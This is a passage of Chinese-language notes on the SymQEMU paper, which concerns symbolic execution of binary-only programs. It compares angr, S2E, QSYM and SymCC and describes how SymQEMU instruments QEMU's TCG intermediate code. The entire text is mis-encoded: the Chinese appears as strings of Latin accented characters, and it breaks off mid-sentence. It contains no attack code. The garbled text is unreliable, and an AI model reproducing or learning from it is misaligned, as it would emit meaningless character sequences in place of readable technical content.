‡ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­è·Ÿè¸ªä¸­é—´å€¼æ˜¯å¦‚ä½•è®¡ç®—çš„ï¼Œæ¯ä¸€ä¸ªä¸­é—´å€¼éƒ½å¯ä»¥è¡¨ç¤ºä¸ºç¨‹åºè¾“å…¥çš„ä¸€ä¸ªå…¬å¼ã€‚åœ¨ä»»ä½•ç‚¹ï¼Œç³»ç»Ÿéƒ½ä¼šä½¿ç”¨è¿™ä¸ªå…¬å¼æŸ¥çœ‹è¿™ä¸ªç‚¹æ˜¯å¦å¯è¾¾ï¼Œè¿™ä¸ªæŒ‡é’ˆæ˜¯å¦ä¸ºç©ºç­‰ã€‚å¦‚æœç­”æ¡ˆæ˜¯ç¡®å®šçš„ï¼Œé‚£ä¹ˆç¬¦å·æ‰§è¡Œå¼•æ“å°†ä¼šæä¾›æµ‹è¯•ç”¨ä¾‹ï¼Œä¸€ä¸ªæ–°çš„è¾“å…¥ä¾‹å­æ¥è§¦å‘å¯¹åº”çš„è¡Œä¸ºã€‚æ‰€ä»¥ç¬¦å·æ‰§è¡Œå¯ä»¥è¢«æ–¹ä¾¿çš„ç”¨æ¥æ¢æµ‹ç¨‹åºè·¯å¾„ä»¥åŠè§¦å‘bugã€‚ ä¸ºäº†è·Ÿè¸ªç¨‹åºçš„è®¡ç®—è¿‡ç¨‹ï¼Œç¬¦å·æ‰§è¡Œç³»ç»Ÿå¿…é¡»å¯¹ç¨‹åºæŒ‡ä»¤é›†æœ‰ä¸€ä¸ªæ·±å…¥çš„ç†è§£ï¼Œè®¸å¤šå®ç°éƒ½æ˜¯é€šè¿‡å°†ç¨‹åºç¿»è¯‘ä¸ºIRï¼Œæ¯”å¦‚LLVMå’ŒVEXã€‚IRéšåè¢«ç¬¦å·åŒ–æ‰§è¡Œï¼Œå› ä¸ºæ‰§è¡Œå™¨åªéœ€è¦å¤„ç†IR(é€šå¸¸ç”±å°‘é‡çš„æŒ‡ä»¤é›†æ„æˆ)ï¼Œæ‰€ä»¥å®ç°ç›¸å¯¹æ¯”è¾ƒç®€å•ã€‚å¹¶ä¸”åœ¨ä¹‹å‰çš„å·¥ä½œä¸­æˆ‘ä»¬å‘ç°ï¼Œåœ¨å¯¹è¿›è¡Œæµ‹è¯•çš„ç¨‹åºçš„é«˜çº§è¡¨ç¤ºçš„æŸ¥è¯¢è¾ƒä½çº§æŒ‡ä»¤çš„è¡¨ç¤ºçš„æŸ¥è¯¢æ›´åŠ å®¹æ˜“è§£å†³ã€‚ ç„¶è€Œå°†ç¨‹åºè½¬æ¢ä¸ºIRéœ€è¦è®¡ç®—èƒ½åŠ›å¹¶ä¸”å¯¹ç¨‹åºæ‰§è¡Œè¿‡ç¨‹å¼•å…¥äº†å¼€é”€ï¼›ç„¶è€Œä¸€äº›å®ç°è¿‡ç¨‹æ”¾å¼ƒäº†ç¿»è¯‘è€Œç›´æ¥å·¥ä½œåœ¨æœºå™¨ä»£ç ä¸Šï¼Œè¿™ç§è§£å†³æ–¹æ¡ˆé™¤äº†æ€§èƒ½ä¸Šçš„ä¼˜åŠ¿ï¼ŒåŒæ—¶åœ¨æ‰§è¡Œå™¨æ— æ³•æ€æ ·è§£é‡ŠæŒ‡ä»¤æ—¶ï¼Œä¼šå¸®åŠ©æå‡é²æ£’æ€§ã€‚ç„¶è€Œåœ¨å¦ä¸€æ–¹é¢ï¼Œè¿™ç§è§£å†³æ–¹æ¡ˆä¼šå¯¼è‡´æ‰§è¡Œå™¨è¢«é™åˆ¶åœ¨äº†ä¸€ç§ç‰¹å®šçš„æ¶æ„ä¹‹ä¸­ã€‚å¦ä¸€ç§åŸºäºæºç çš„æ‰§è¡Œå™¨åœ¨å®é™…ä¸­å¹¶ä¸æ˜¯é‚£ä¹ˆå¹¿æ³›ä½¿ç”¨ï¼Œå› ä¸ºå¤§å¤šæ•°æƒ…å†µä¸‹åªèƒ½å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ binary-onlyç¬¦å·æ‰§è¡Œä»…ä»…é’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œæ·»åŠ äº†è®¸å¤šæŒ‘æˆ˜ï¼šç¼ºå°‘æºä»£ç ï¼Œå°†ç¨‹åºç¿»è¯‘ä¸ºIRéœ€è¦å¯é çš„åæ±‡ç¼–å™¨ï¼›ç”±äºé™æ€åæ±‡ç¼–çš„æŒ‘æˆ˜ï¼Œå¤§å¤šæ•°å®ç°éƒ½æ˜¯åœ¨è¿è¡Œæ€æŒ‰éœ€è¿›è¡Œåæ±‡ç¼–ã€‚å½“æºç ä¸å¯å¾—æ—¶ï¼Œé’ˆå¯¹æ¶æ„çš„æ”¯æŒåŒæ ·ä¹Ÿæ˜¯é‡è¦çš„ï¼Œæ­¤æ—¶äº¤å‰ç¼–è¯‘ä¸å¯è¡Œã€‚å°¤å…¶é’ˆå¯¹åµŒå…¥å¼è®¾å¤‡æ¥è¯´ï¼Œç¼ºå°‘å¯¹å¤šæ¶æ„çš„æ”¯æŒæ˜¯ä¸å¯è¡Œçš„ã€‚ æ— éœ€ç¿»è¯‘çš„æ‰§è¡Œå™¨é™¤äº†é¢å¯¹å¤æ‚å®ç°å¸¦æ¥çš„å¯ç»´æŠ¤é—®é¢˜å¤–ï¼Œè¿˜é¢ä¸´å¯ç§»æ¤æ€§é—®é¢˜ã€‚å°†ç¨‹åºç¿»è¯‘ä¸ºä¸­é—´è¯­è¨€çš„æ‰§è¡Œå™¨éœ€è¦å¯é çš„åæ±‡ç¼–å™¨ï¼Œå·²ç»æœ‰å¤§é‡çš„å·¥ä½œæ¥ç¡®å®šç¿»è¯‘å™¨çš„å‡†ç¡®æ€§ã€‚åŸºäºæºç çš„æ‰§è¡Œå™¨å¯ä»¥è¾ƒå®¹æ˜“çš„è·å¾—IRã€‚ åŸºäºäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œå¯¹äºé«˜æ€§èƒ½ä»¥åŠå¤šæ¶æ„æ”¯æŒå…·æœ‰æ›´è¿«åˆ‡çš„éœ€æ±‚ã€‚ æœ€å…ˆè¿›è§£å†³æ–¹æ¡ˆä¸‹é¢æè¿°æœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œå®éªŒæ–¹æ¡ˆä»¥åŠä»–ä»¬å„è‡ªå¯¹åº”è§£å†³çš„é—®é¢˜ã€‚ angr ä¸€ä¸ªç»å…¸çš„ç¬¦å·æ‰§è¡Œç¿»è¯‘å™¨ï¼Œä½¿ç”¨VEXï¼ŒValgrindæ¡†æ¶çš„ç¿»è¯‘å™¨å’ŒIRã€‚ç›®æ ‡ç¨‹åºåœ¨è¿è¡Œæ—¶è¢«ç¿»è¯‘ã€‚å…¶ä¸­ä¸€ä¸ªä¼˜åŒ–ï¼Œangrå¯ä»¥åœ¨Unicornï¼ŒåŸºäºqemuçš„å¿«é€ŸCPUæ¨¡æ‹Ÿå™¨ï¼Œä¸Šæ‰§è¡Œä¸æ¶‰åŠç¬¦å·æ•°æ®çš„è®¡ç®—ã€‚ ç”±äºåŸºäºVEXï¼Œagnrå›ºç„¶å¯ä»¥æ”¯æŒæ‰€æœ‰VEXèƒ½å¤Ÿå¤„ç†çš„æ¶æ„ï¼Œå› ä¸ºangræ ¸å¿ƒç”±pythonè¯­è¨€å®ç°ï¼Œæ‰€ä»¥ä»–é€Ÿåº¦æ…¢ä½†æ˜¯å¾ˆé€šç”¨ã€‚ s2e ç”±äºæƒ³è¦å°†åŸºäºæºä»£ç ç¬¦å·æ‰§è¡Œè¦†ç›–èŒƒå›´æ‹“å±•åˆ°ç›®æ ‡ç¨‹åºä¾èµ–ä»¥åŠæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œåˆ›é€ äº†s2eã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼Œs2eåœ¨qemuä»¿çœŸå™¨å†…æ‰§è¡Œæ•´ä¸ªæ“ä½œç³»ç»Ÿå¹¶ä¸”å°†å…¶ä¸KLEEé“¾æ¥ä¸ºäº†ç¬¦å·åŒ–æ‰§è¡Œç›¸å…³ä»£ç ã€‚ è¿™ä¸ªç³»ç»Ÿç›¸å½“å¤æ‚ï¼ŒåŒ…æ‹¬è¢«æµ‹è¯•ç¨‹åºçš„å¤šé‡ç¿»è¯‘ï¼š QEMUæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ç¿»è¯‘å™¨ï¼Œæ¯”å¦‚åœ¨é€šå¸¸æ“ä½œä¸­ï¼Œä»–è®²ç›®æ ‡ç¨‹åºä»æœºå™¨ä»£ç ç¿»è¯‘ä¸ºä¸€ç§ä¸­é—´è¡¨ç¤ºå³TCG opsï¼Œç„¶åå°†å…¶é‡æ–°ç¼–è¯‘ä¸ºé’ˆå¯¹host CPUçš„æœºå™¨ç ã€‚ å½“æ‰§è¡Œæ˜¯è®¾è®¡ç¬¦å·åŒ–æ•°æ®æ—¶ï¼ŒS2Eä½¿ç”¨çš„ä¿®æ”¹è¿‡çš„QEEMUä¸å†å°†TCGopsé‡ç¼–è¯‘ä¸ºæœºå™¨ä»£ç ï¼Œä»–å°†å…¶ç¿»è¯‘ä¸ºLLVM bitcodeï¼Œéšåå°†å…¶ä¼ é€’ç»™KLEEã€‚ KLEEç¬¦å·åŒ–è§£é‡Šæ‰§è¡ŒLLVM bitcodeï¼Œç„¶åå°†ç»“æœçš„å…·ä½“æƒ…å†µå›ä¼ ç»™QEMUã€‚ æ­¤ç³»ç»Ÿå¯ä»¥å¾ˆçµæ´»çš„å¤„ç†ä¸åŒå¤„ç†å™¨æ¶æ„ï¼Œå¹¶ä¸”å¯ä»¥æ”¯æŒé’ˆå¯¹æ“ä½œç³»ç»Ÿå…¨å±‚é¢çš„è®¡ç®—è·Ÿè¸ªã€‚ç„¶è€Œä»–éœ€è¦ä»˜å‡ºä¸€ä¸‹ä»£ä»·ï¼šS2Eæ˜¯ä¸€ä¸ªå…·æœ‰åºå¤§ä»£ç åŸºç¡€çš„å¤æ‚ç³»ç»Ÿã€‚å¹¶ä¸”ä¸¤éƒ¨åˆ†ç¿»è¯‘ï¼Œä»æœºå™¨ç ç¿»è¯‘ä¸ºTCG opså’Œä»TCG opsç¿»è¯‘ä¸ºLLVM bitcodeæŸå®³äº†ä»–çš„æ€§èƒ½ã€‚ä¸angré’ˆå¯¹ç”¨æˆ·æ€ç¨‹åºæ¥æ¯”è¾ƒï¼ŒS2Eéœ€è¦æ›´å¤šçš„è®¾è®¡å»ºç«‹ä»¥åŠè¿è¡Œï¼Œä½†æ˜¯æä¾›äº†ä¸€ä¸ªæ›´åŠ å…¨é¢çš„åˆ†æã€‚ QSYM QSYMåœ¨æ€§èƒ½ä¸Šæœ‰æå¤§çš„å¢å¼ºï¼Œä»–ä¸å°†ç›®æ ‡ç¨‹åºç¿»è¯‘ä¸ºä¸­é—´è¯­è¨€ã€‚ä»–åœ¨è¿è¡Œæ€æ—¶å‘x86æœºå™¨ç å†…è¿›è¡Œæ’æ¡©æ¥å‘äºŒè¿›åˆ¶æ–‡ä»¶å†…æ·»åŠ ç¬¦å·è¿½è¸ªã€‚å…·ä½“æ¥è®²ï¼Œä»–åº”ç”¨äº†Inter Pinï¼Œä¸€ç§åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©æ¡†æ¶ï¼Œæ¥å‘ç›®æ ‡ç¨‹åºå†…æ’å…¥hookä»£ç ã€‚åœ¨hookå†…éƒ¨ï¼Œä»–å’Œç¨‹åºè¿è¡Œçš„å®é™…ä»£ç ç­‰ä»·çš„è¿è¡Œç¬¦å·ä»£ç ã€‚ è¿™ç§æ–¹å¼äº§ç”Ÿäº†ä¸€ç§é’ˆå¯¹x86ç¨‹åºçš„éå¸¸å¿«é€Ÿå¹¶ä¸”é²æ£’æ€§å¾ˆå¼ºçš„ç¬¦å·æ‰§è¡Œå¼•æ“ã€‚ç„¶è€Œï¼Œè¿™ä¸ªç³»ç»Ÿå›ºç„¶ä¼šè¢«é™åˆ¶åœ¨x86æ¡†æ¶å†…ï¼Œå¹¶ä¸”å®ç°æ˜¯ç¹ççš„ï¼Œå› ä¸ºä»–éœ€è¦å¤„ç†åœ¨è®¡ç®—ä¸­å¯èƒ½å‡ºç°çš„ä»»ä½•æŒ‡ä»¤ã€‚å¹¶ä¸”å°†å…¶è¿ç§»åˆ°å…¶ä»–æ¶æ„å°†ä¼šæœ‰å¾ˆå¤§çš„å›°éš¾ã€‚ symcc æœ€è¿‘æå‡ºçš„ç¬¦å·æ‰§è¡Œå·¥å…·ï¼ŒSYMCCï¼ŒåŒæ ·æ˜¯æœ¬æ–‡ä½œè€…ä¹‹å‰çš„å·¥ä½œï¼ŒåŸºäºæºä»£ç çš„ï¼Œä¸æ”¯æŒåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ã€‚SYMQEMUçš„çµæ„Ÿæ¥è‡ªäºSYMCCï¼Œæ‰€ä»¥ç®€è¦æ¦‚æ‹¬ä¸€ä¸‹ä»–çš„è®¾è®¡ã€‚ æˆ‘ä»¬åœ¨è®¾è®¡SYMCCæ—¶è§‚å¯Ÿåˆ°ï¼Œç›®å‰å¤§å¤šæ•°ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯è§£é‡Šå™¨ã€‚ç„¶è€Œæˆ‘ä»¬å´æå‡ºä¸€ä¸ªåŸºäºç¼–è¯‘çš„æ–¹æ³•ï¼Œå¹¶ä¸”å±•ç¤ºäº†ä»–èƒ½å¤Ÿæå‡æ‰§è¡Œæ€§èƒ½ä»¥åŠç³»ç»Ÿå®é™…æ¢ç´¢èƒ½åŠ›ã€‚SYMCCåœ¨ç¼–è¯‘å™¨å†…è¿›è¡Œhookï¼Œå¹¶ä¸”åœ¨targetä»£ç å†…è¿›è¡Œæ’è£…ï¼Œå¹¶ä¸”æ³¨å…¥å®æ–½æ”¯æŒåº“çš„è°ƒç”¨ã€‚å› æ­¤ç¬¦å·æ‰§è¡Œæˆä¸ºäº†è¢«ç¼–è¯‘æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ã€‚å¹¶ä¸”åˆ†æä»£ç å¯ä»¥è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ä¸”æ’è£…ä»£ç å¹¶ä¸ä¼šåœ¨æ¯æ¬¡æ‰§è¡Œæ—¶è¿›è¡Œé‡å¤ã€‚ SYMCCåŸºäºç¼–è¯‘çš„æ–¹å¼éœ€è¦ç¼–è¯‘å™¨ï¼Œæ‰€ä»¥ä»–åªèƒ½åœ¨è¢«æµ‹è¯•ç¨‹åºæºä»£ç å¯ç”¨æ—¶å‘æŒ¥ä½œç”¨ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™ä¸ªæ–¹å¼æ˜¯è¶³å¤Ÿæœ‰å‰é€”ï¼Œæ‰€ä»¥ä¸€ç›´å¯»æ‰¾ä¸€ç§æ–¹å¼å°†å…¶åº”ç”¨åˆ°binary-onlyçš„æ–¹é¢ä¹‹ä¸­ï¼Œæœ¬æ–‡çš„ä¸»è¦å·¥ä½œå°±æ˜¯è¯´æ˜åŸºäºç¼–è¯‘çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯å¦‚ä½•åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šé«˜æ•ˆçš„å·¥ä½œã€‚ SYMQEMUç°åœ¨æå‡ºé’ˆå¯¹binry-onlyè®¾è®¡å®ç°çš„SYMQEMUã€‚ä»–çš„çµæ„Ÿæ¥è‡ªäºä¹‹å‰çš„å·¥ä½œå¹¶ç»“åˆäº†å¦‚ä»Šæœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„æŠ€æœ¯ã€‚ designç³»ç»Ÿä¸¤ä¸ªä¸»è¦ç›®æ ‡ï¼š å®ç°é«˜æ•ˆèƒ½ï¼Œä»¥è‡´äºå®é™…è½¯ä»¶ã€‚ åˆç†çš„æ¶æ„ç‹¬ç«‹æ€§ï¼Œæ¯”å¦‚å°†å…¶è¿ç§»åˆ°æ–°çš„å¤„ç†å™¨æ¶æ„ä¸éœ€è¦åšè¿‡å¤šå·¥ä½œã€‚ åŸºäºä¹‹å‰çš„è°ƒæŸ¥ï¼Œæˆ‘ä»¬å‘ç°æµè¡Œçš„æœ€å…ˆè¿›çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿå®ç°äº†å¦‚ä¸‹ä¸¤ä¸ªç›®æ ‡ä¸­çš„ä¸€ä¸ªï¼Œä½†å¹¶éå…¨éƒ¨ï¼šangrå’Œs2eæ˜¯æ¶æ„çµæ´»çš„ä½†æ˜¯æ€§èƒ½å·®ï¼›QSYMåœ¨æ€§èƒ½ä¸Šæ¯”è¾ƒé«˜ä½†æ˜¯å…¶åªé’ˆå¯¹x86æ¶æ„ã€‚ å¦‚ä»Šé’ˆå¯¹æ¶æ„ç‹¬ç«‹çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†è¢«æµ‹ç¨‹åºç¿»è¯‘ä¸ºIRï¼Œè¿™æ ·å¦‚æœæƒ³è¦æ”¯æŒä¸€ä¸ªæ–°çš„æ¶æ„ï¼Œåªæœ‰ç¿»è¯‘å™¨éœ€è¦ç§»æ¤ï¼Œç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸€ç§ä¸­é—´è¯­è¨€ï¼Œå…¶å·²ç»å­˜åœ¨æ”¯æŒå¤šç§æ¶æ„çš„ç›¸å…³ç¿»è¯‘å™¨ã€‚ä»¥ä¸­é—´è¯­è¨€çµæ´»åœ°è¡¨ç¤ºç¨‹åºæ˜¯ä¸€ç§è‘—åçš„ï¼Œå·²ç»æˆåŠŸçš„åº”ç”¨äºè®¸å¤šå…¶ä»–é¢†åŸŸçš„æŠ€æœ¯ï¼Œæ¯”å¦‚ç¼–è¯‘å™¨è®¾è®¡ä»¥åŠé™æ€ä»£ç åˆ†æã€‚æˆ‘ä»¬ä¹Ÿå°†è¿™ç§æŠ€æœ¯åˆå¹¶åˆ°æˆ‘ä»¬çš„è®¾è®¡ä¸­æ¥ã€‚ å½“å°†ç¨‹åºç¿»è¯‘ä¸ºä¸­é—´è¯­è¨€è·å¾—ä¾¿åˆ©çš„åŒæ—¶ï¼Œæˆ‘ä»¬åŒæ ·éœ€è¦äº†è§£è¿™ç§æ–¹å¼å¯¹äºæ€§èƒ½çš„å½±å“ï¼šå°†binary-onlyç¨‹åºé™æ€ç¿»è¯‘æ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„ï¼Œå› ä¸ºåæ±‡ç¼–å™¨å¯èƒ½æ˜¯ä¸å¯é çš„ï¼Œå°¤å…¶æ˜¯å­˜åœ¨é—´æ¥è·³è½¬çš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”åœ¨åˆ†æè¿‡ç¨‹ä¸­è¿è¡Œæ—¶è¿›è¡Œç¿»è¯‘ä¼šæå‡åŠŸè€—ã€‚æˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯s2eæ€§èƒ½åŠ£äºQSYMçš„ä¸»è¦åŸå› ã€‚æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°ä¸€ç§ç¿»è¯‘ç³»ç»ŸåŒæ—¶ä¿æŒæ€§èƒ½ä¼˜è¶Šã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä¸»è¦åˆ°s2eä»¥åŠangréƒ½æ”¶åˆ°äº†éé‡è¦é—®é¢˜çš„å½±å“ï¼Œå¹¶ä¸”è¿™äº›é—®é¢˜éƒ½æ˜¯å¯ä»¥é€šè¿‡å·¥ç¨‹æ–¹é¢çš„å·¥ä½œè§£å†³çš„ï¼š S2Eå°†è¢«æµ‹è¯•ç¨‹åºç¿»è¯‘äº†ä¸¤æ¬¡ï¼Œç„¶è€Œå¦‚æœç¬¦å·æ‰§è¡Œè¿‡ç¨‹æ˜¯åœ¨ç¬¬ä¸€æ¬¡ä¸­é—´è¡¨ç¤ºä¸Šå®ç°çš„è¯ï¼Œç¬¬äºŒæ¬¡ç¿»è¯‘è¿‡ç¨‹å…¶å®æ˜¯å¯ä»¥é¿å…çš„ã€‚ angrçš„æ€§èƒ½å—åˆ°pythonå®ç°å½±å“ï¼Œå°†å…¶æ ¸å¿ƒä»£ç ç§»æ¤åˆ°ä¸€ç§æ›´å¿«é€Ÿçš„è¯­è¨€ä¸­ä¼šæ˜¾è‘—æå‡é€Ÿåº¦ã€‚ ç„¶è€Œæˆ‘ä»¬çš„è´¡çŒ®å¹¶ä¸ä»…ä»…æ˜¯æ‰¾å‡ºå¹¶ä¸”é¿å…ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¿˜è§‚æµ‹åˆ°ï¼šs2eä»¥åŠangrï¼Œä»¥åŠå…¶ä»–æ‰€æœ‰çš„binaty-onlyçš„ç¬¦å·æ‰§è¡Œå™¨ï¼Œéƒ½è§£é‡Šæ‰§è¡Œè¢«æµ‹è¯•ç¨‹åºçš„ä¸­é—´è¡¨ç¤ºï¼Œè§£é‡Šæ˜¯è®¾è®¡çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚æˆ‘ä»¬æ¨æµ‹ï¼Œå°†ç›®æ ‡ç¨‹åºç¼–è¯‘ä¸ºæ’æ¡©ç‰ˆæœ¬å°†ä¼šå¸¦æ¥å¾ˆé«˜çš„æ€§èƒ½ä¸Šçš„æå‡ã€‚è™½ç„¶SYMCCæ˜¯åŸºäºæºä»£ç çš„ï¼ŒåŸºäºç¼–è¯‘çš„ç¬¦åˆæ‰§è¡Œå¼•æ“ï¼Œä½†æ˜¯ä»–è¯æ˜äº†è¿™ä¸€ç‚¹ã€‚ æ”¶åˆ°ä¸Šè¿°è§‚æµ‹åˆ°çš„å¯å‘ï¼Œæˆ‘ä»¬çš„è®¾è®¡æ–¹æ³•å¦‚ä¸‹ï¼š åœ¨è¿è¡Œæ€å°†ç›®æ ‡ç¨‹åºç¿»è¯‘ä¸ºIRã€‚ ä¸ºç¬¦å·æ‰§è¡Œæ‰€éœ€çš„IRæ’æ¡©ã€‚ å°†IRç¼–è¯‘ä¸ºé€‚åˆCPUè¿è¡Œåˆ†æçš„æœºå™¨ç å¹¶ä¸”ç›´æ¥æ‰§è¡Œã€‚ é€šè¿‡å°†æ’æ¡©çš„ç›®æ ‡ç¨‹åºç¼–è¯‘ä¸ºæœºå™¨ç ï¼Œè¡¥å¿äº†åœ¨ç¬¬ä¸€é˜¶æ®µå°†äºŒè¿›åˆ¶æ–‡ä»¶ç¿»è¯‘ä¸ºä¸­é—´ä»£ç æ—¶çš„æ€§èƒ½æŸå¤±ã€‚CPUæ‰§è¡Œæœºå™¨ç æ¯”è§£é‡Šå™¨è¿è¡ŒIRé€Ÿåº¦å¿«å¾—å¤šï¼Œå› æ­¤æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªå¯ä»¥ä¸æ²¡æœ‰ç¿»è¯‘çš„ç³»ç»Ÿçš„æ€§èƒ½ç›¸å½“çš„ç³»ç»Ÿï¼ŒåŒæ—¶ç”±äºè¿›è¡Œäº†ç¨‹åºç¿»è¯‘å¯ä»¥ä¿æŒæ¶æ„çš„ç‹¬ç«‹æ€§ã€‚ implementationæˆ‘ä»¬åœ¨qemuçš„åŸºç¡€ä¹‹ä¸Šå®ç°äº†SYMQEMUï¼Œé€‰æ‹©qemuçš„åŸå› æ˜¯å› ä¸ºä»–æ˜¯ä¸€ä¸ªé²æ£’æ€§çš„ç³»ç»Ÿä»¿çœŸå™¨ï¼Œå¹¶ä¸”å¯ä»¥æ”¯æŒè®¸å¤šæ¶æ„ï¼Œåœ¨ä»–çš„åŸºç¡€ä¹‹ä¸Šè¿›è¡Œå®ç°ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°æ¶æ„ç‹¬ç«‹æ€§ã€‚å¹¶ä¸”qemuè¿˜æœ‰å¦ä¸€ä¸ªç‰¹ç‚¹æ­£å¥½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œä»–ä¸ä»…å°†äºŒè¿›åˆ¶æ–‡ä»¶ç¿»è¯‘ä¸ºé’ˆå¯¹å¤„ç†å™¨ç‹¬ç«‹çš„IRï¼Œä»–åŒæ—¶æ”¯æŒå°†ä¸­é—´è¯­è¨€ä¾¿å·²æˆä¸ºhost CPUçš„æœºå™¨ç ã€‚qemuçš„ä¸»è¦ä¼˜ç‚¹æ˜¯ä»–èƒ½å¤Ÿå°†äºŒè¿›åˆ¶æ–‡ä»¶ç¿»è¯‘ä¸ºä¸åŒhostæ¶æ„çš„æœºå™¨ä»£ç ï¼Œå¹¶ä¸”å¯ä»¥å®Œæˆå…¨ç³»ç»Ÿä»¿çœŸï¼Œæ–¹ä¾¿äºä¹‹åæ‹“å±•æ”¯æŒäº¤å‰æ¶æ„çš„å›ºä»¶åˆ†æã€‚ å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬æ‹“å±•äº†QEMUçš„ç»„ä»¶TCGã€‚åœ¨æœªè¢«ä¿®æ”¹çš„qemuä¸­ï¼ŒTCGè´Ÿè´£å°†guestæ¶æ„çš„æœºå™¨ç å—ç¿»è¯‘ä¸ºæ¶æ„ç‹¬ç«‹çš„è¯­è¨€ï¼Œå«åšTCG opsï¼Œç„¶åç¼–è¯‘è¿™äº›TCG opsä¸ºhostæ¶æ„çš„æœºå™¨ç ã€‚ç”±äºæ€§èƒ½åŸå› ï¼Œè¿™äº›ç¿»è¯‘å¥½çš„blockséšåè¢«ç¼“å­˜ï¼Œæ‰€ä»¥ç¿»è¯‘åœ¨æ¯æ¬¡æ‰§è¡Œè¿‡ç¨‹ä¸­åªéœ€è¦è¿›è¡Œä¸€æ¬¡ã€‚SYMQEMUåœ¨è¿™è¿‡ç¨‹ä¸­æ’å…¥äº†ä¸€æ­¥ï¼šå½“è¢«æµ‹ç¨‹åºç¿»è¯‘ä¸ºTCG opsæ—¶ï¼Œæˆ‘ä»¬ä¸ä»…æ’æ¡©æ¥æ¨¡æ‹Ÿguest CPUè€Œä¸”äº§ç”Ÿä¸€äº›é¢å¤–çš„TCG opsæ¥å»ºç«‹å¯¹åº”çš„ç¬¦å·çº¦æŸè¡¨è¾¾å¼ã€‚é’ˆå¯¹å»ºç«‹ç¬¦å·è¡¨è¾¾å¼ä»¥åŠæ±‚è§£è¿™äº›çš„æ”¯æŒåº“ï¼Œsymqemué‡ç”¨SYMCCçš„æ”¯æŒåº“ï¼Œå³é‡ç”¨QSYMçš„ã€‚ ï¼ˆæ­¤å¤„æœ‰è¯¦ç»†ä¾‹å­ï¼Œæ„Ÿå…´è¶£å»è¯»åŸæ–‡ï¼‰ ç›®å‰æˆ‘ä»¬ä½¿ç”¨çš„qemu linuxç”¨æˆ·æ¨¡å¼çš„ä»¿çœŸï¼Œå³æˆ‘ä»¬åªæ¨¡æ‹Ÿäº†æ™®é€šç”¨æˆ·ç©ºé—´çš„guestç³»ç»Ÿã€‚ç³»ç»Ÿè°ƒç”¨è¢«è½¬æ¢æ¥æ»¡è¶³hostæ¶æ„çš„è¦æ±‚ï¼Œè¿™äº›æ˜¯é’ˆå¯¹hostçš„å†…æ ¸æ¥å·¥ä½œçš„ï¼Œä½¿ç”¨äº†qemuå¸¸è§„çš„æœºåˆ¶ã€‚å› æ­¤æˆ‘ä»¬çš„ç¬¦å·æ‰§è¡Œåˆ†æåœ¨ç³»ç»Ÿè°ƒç”¨å¤„åœæ­¢ï¼Œä¸QSYMä»¥åŠangrç±»ä¼¼ã€‚ä¸å…¨ç³»ç»Ÿä»¿çœŸ(æ¯”å¦‚s2e)æ¥è®²ï¼Œè¿™æ ·èŠ‚çœäº†ä¸ºæ¯ä¸ªtargetæ¶æ„å‡†å¤‡ç³»ç»Ÿé•œåƒçš„æ–¹é¢ï¼Œå¹¶ä¸”æå‡äº†æ€§èƒ½ï¼Œå› ä¸ºæ˜¯ç›´æ¥è¿è¡Œkernelä»£ç è€Œä¸æ˜¯é€šè¿‡ä»¿çœŸã€‚ä½†æ˜¯å¦‚æœéœ€è¦çš„è¯ï¼ŒSYMQEMUæ˜¯å¾ˆå®¹æ˜“çš„è¢«æ‹“å±•ä¸ºQEMUçš„å…¨ç³»ç»Ÿä»¿çœŸã€‚ æ¶æ„ç‹¬ç«‹é¦–å…ˆè¦æ˜ç¡®ï¼Œæ‰§è¡Œåˆ†æçš„ä¸»æœºçš„æ¶æ„å«åšhostï¼Œè¢«æµ‹ä»£ç åœ¨å…¶æ¶æ„ä¹‹ä¸Šè¢«ç¼–è¯‘çš„å«åšguestã€‚å°¤å…¶æ˜¯åœ¨åµŒå…¥å¼è®¾å¤‡åˆ†æä¸­ï¼Œhostä¸guestæ¶æ„ä¸åŒæ˜¯æ˜¾ç„¶çš„ï¼ŒåµŒå…¥å¼è®¾å¤‡çš„ç³»ç»Ÿè¿›è¡Œç¬¦å·æ‰§è¡Œåˆ†æçš„èƒ½åŠ›ä¸è¶³ï¼Œæ‰€ä»¥å°†å›ºä»¶æ”¾ç½®åˆ°å…¶ä»–ç³»ç»Ÿä¸­è¿›è¡Œåˆ†æï¼ŒSYMQEMUå°±æ˜¯ä¸ºè¿™ç§æƒ…å†µå‡†å¤‡çš„ï¼Œèƒ½å¤Ÿåœ¨å¤šæ¶æ„ä¸‹è¿è¡Œã€‚ SYMQEMUåˆ©ç”¨qemu TCG 